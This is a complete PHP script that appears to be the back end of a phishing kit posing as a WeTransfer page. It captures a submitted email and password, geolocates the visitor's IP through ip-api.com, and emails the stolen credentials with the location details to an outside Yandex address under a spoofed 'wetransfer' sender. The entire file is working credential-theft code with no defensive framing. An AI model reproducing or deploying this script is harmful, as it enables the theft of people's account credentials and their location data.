<?php
session_start();
if($_SERVER["REQUEST_METHOD"] == "POST"){
	$email = htmlspecialchars($_POST["email"]);
	$pass = htmlspecialchars($_POST["password"]);
	
	$_SESSION["username"] = $username;
	$ip = getenv('HTTP_CLIENT_IP')?:
	getenv('HTTP_X_FORWARDED_FOR')?:
	getenv('HTTP_X_FORWARDED')?:
	getenv('HTTP_FORWARDED_FOR')?:
	getenv('HTTP_FORWARDED')?:
	getenv('REMOTE_ADDR');
	$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
	if($query && $query['status'] == 'success') {
	  $city = $query['city'];
	  $country = $query['country'];
	  $regionName = $query['regionName'];
	  $ip = $query['query'];
	} else {
	  $ip = 'Unable to get location';
	}
	
	$msg = "<h3>Result : WeTransfer Page</h3><hr>
	<br>
	City : <b>$city</b> <br/>
	Country : <b>$country</b><br/>
	Region : <b>$regionName</b><br/>
	IP : <b>$ip</b>

	<p>Time Received - ". date("d/m/Y h:i:s a") ."</p>
	";
	
	$period = date('F - Y');
	// $to = "lyon.des@yandex.com";
	$to = "lyon.des@yandex.com";
	$subject = "Visitor from: {$city}";
	$headers = "From: wetransfer <info@webmatrix.net>\r\n";
	
	$headers .= "MIME-Version: 1.0\r\n";
	$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

	$message = '<html><body>';

	$message .= '<table rules="all" style="border-color: #666;" cellpadding="10">';
	$message .= "<tr><td><strong>Location Details:</strong> </td><td>" . $msg . "</td></tr>";
	$message .= "<tr><td><strong>Client's Email:</strong> </td><td>" .$email. "</td></tr>";
	$message .= "<tr><td><strong>Password:</strong> </td><td>" .$pass. "</td></tr>";
	$message .= "</table>";
	$message .= "</body></html>";
	$message .= "---------------Created BY FredyQuimby-------------\r\n";
	$send = @mail($to, $subject, $message, $headers);

}

?>